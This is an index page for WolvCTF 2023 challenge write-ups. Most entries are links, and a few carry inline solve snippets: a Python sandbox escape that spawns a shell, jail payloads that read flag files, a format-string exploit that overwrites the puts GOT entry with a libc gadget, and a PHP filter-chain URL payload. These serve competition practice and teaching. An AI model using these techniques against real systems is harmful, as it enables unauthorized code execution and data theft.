---
title: WolvCTF 2023
weight: 0
---
# WolvCTF 2023

- [CTFTime](https://ctftime.org/event/1866)
- [GitHub Repository](https://github.com/WolvSec/WolvCtf-2023-Challenges-Public)

## **crypto**
### theyseemerolling
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### keyexchange
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/keyexchange
### Galois-t is this?
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/galois-t_is_this
### Z2kDH
- https://github.com/nass15456/CTFs/blob/main/WolvCTF/Z2kDH.md
### Down Under
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/downunder
### Tealy Man


## **forensics**
### Elytra
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Dino Trading
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Dino_Trading-Easy/solve.md
### important_notes
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Employee 427: Compromised
- https://chrootcommit.github.io/WolvCtf2023
- https://blog.hamayanhamayan.com/entry/2023/03/20/212836
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Employee_427Compromised-Easy/solve.md
### Employee 427: Locate
- https://chrootcommit.github.io/WolvCtf2023
- https://blog.hamayanhamayan.com/entry/2023/03/20/212836
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Employee_427Locate-Medium/solve.md
### Employee 428: Recovery
- https://github.com/WolvSec/WolvCtf-2023-Challenges-Public/blob/main/forensics/Employee-428-Recovery/solve.md


## **misc**
### Escaped
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### We Will Rock You
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Limited Characters
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469

{{< details title="yuzu#0233" >}}
```python
from pwn import *

payload = '__import__("os").system("sh")'

def _(num):
  return "+".join(["1" for i in range(num)])

res = []
for char in payload:
  res.append(f'chr({_(ord(char))})')

payload = '+'.join(res) + "+repr(' ()+,.1<[]_cdehijlmnoprsy')[1]"
p = remote('limited-characters.wolvctf.io', 1337)
p.sendline(payload)
p.interactive()
```
{{< /details >}}
### Smuggler
- https://www.youtube.com/watch?v=OWSoZHIOdVM
### Abstract Art
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### yellsatjavascript
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469

{{< details title="xl00t#5697" open=true >}}
```javascript
log = console["log"];
buf = new Buffer("ZmxhZw==",'base64')["toString"]();
log(process['env'][buf]);
```
{{< /details >}}
{{< details title="bhu#7316" open=true >}}
```javascript
console['log'](process['env']['fl'+'ag'])
```
{{< /details>}}
### yellsatpython
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469

{{< details title="xl00t#5697" open=true >}}
```python
next(open("/home/user/flag"+chr(46)+"txt))
```
{{< /details >}}
{{< details title="yuzu#0233" open=true >}}
```python
from pwn import *

r = remote('yellsatpython.wolvctf.io', 1337)
payload = "next(open('flag\\x2etxt'))"
r.sendline(payload)
r.interactive()
```
{{< /details >}}
### yellsatbefunge1
{{< details title="Silicate#4370" open=true >}}
```bash
v###############v###############< 
```
{{< /details>}}
### yellsatbefunge2
### yellsatbefunge3
### yellsatbefunge4


## **osint**
### WannaFlag I: An Introduction
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag II: Payments
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag III: Infiltration
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag IV: Exfiltration
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag V: The Mastermind
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/


## **pwn**
### Baby PWN
### Cat
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Squirrel Feeding
- https://ctf.krloer.com/writeups/wolvctf/squirrel_feeding/
### wtml
{{< details "Quintin#1337" >}}
```python
import argparse

from pwn import *

def solve(io):
print(io.recvuntil(b'Please enter your WTML!\n'))
payload = b'<\x00>' + b'%13$018p'
payload += b'A' * (0x20 - len(payload) - 2) + b'</'
print(hexdump(payload))
io.send(payload)

print(io.recvuntil(b'What tag would you like to replace [q to quit]?\n'))
io.sendline(b'\x00')
print(io.recvuntil(b'With what new tag?\n'))
io.sendline(b'\x01')

print(io.recvuntil(b'What tag would you like to replace [q to quit]?\n'))
io.sendline(b'A')
print(io.recvuntil(b'With what new tag?\n'))
io.sendline(b'B')

print(io.recvuntil(b'[DEBUG] '))

leak = io.recvuntil(b'Please provide feedback about v2: ')
print(hexdump(leak))

libc_leak = int(leak[5:5 + 16], 16)
libc_base = libc_leak - elf.libc.sym['_IO_file_write'] - 0x2d
print('libc base', hex(libc_base))

text_leak = u64(leak[0x20 + 10 + 1:0x20 + 10 + 1 + 6] + b'\x00' * 2)
text_base = text_leak - elf.sym['replace_tag_v1']
print('text base', hex(text_base))

puts_got = text_base + elf.got['puts']
one_gadget = libc_base + 0xe3b01

writes = {
    puts_got: one_gadget
}
payload = fmtstr_payload(8, writes)

print(hexdump(payload))
io.sendline(payload)


if __name__ == '__main__':
parser = argparse.ArgumentParser()
parser.add_argument('--debug', action='store_true')
parser.add_argument('--remote', type=str, default=None)

args = parser.parse_args()

elf = context.binary = ELF('challenge')

if args.debug:
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(context.binary.path, '''
    set follow-fork-mode child
    break main
    continue
    ''')
elif args.remote:
    ip, port = args.remote.split(':')
    io = remote(ip, port)
else:
    io = process()  # Actually start running the process

solve(io)

io.interactive()
```
{{< /details >}}
  ### echo2
- https://ctf.krloer.com/writeups/wolvctf/echo2/


## **rev**
### child re
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://fallingskies22.github.io/post/wolvctf-2023-reverse-child-re/
### baby re
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Homework Help
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Reverse-Homework_Help-Easy-Medium/solve.md
### 64r2
### yowhatsthepassword
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### ej
- https://nicholas-wei.github.io/2023/03/20/ej/
- https://github.com/autoexecbat-ctf/write-ups/tree/main/wolvctf2023/ej


## **web**
### Charlotte's Web
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Hidden CSS
### Adversal
- https://github.com/Nolan1324/adversal-wolvctf-2023/tree/main/solvers
### Filter Madness
{{< details title="SamXML#6151" open=true >}}
```python
f"{CHAL_URL}/?madness=resource=data:,14%0D%0Azombies%20for%20the%20flag%0D%0A0%0D%0A|dechunk"
```
{{< /details >}}  
### Zombie 101
- https://chrootcommit.github.io/WolvCtf2023
- https://www.youtube.com/watch?v=HzJd4qxI1pc
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Zombie 201
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
### Zombie 301
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://xl00t.fr/posts/wolvctf-2023-zombie-301-401/
### Zombie 401
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://xl00t.fr/posts/wolvctf-2023-zombie-301-401/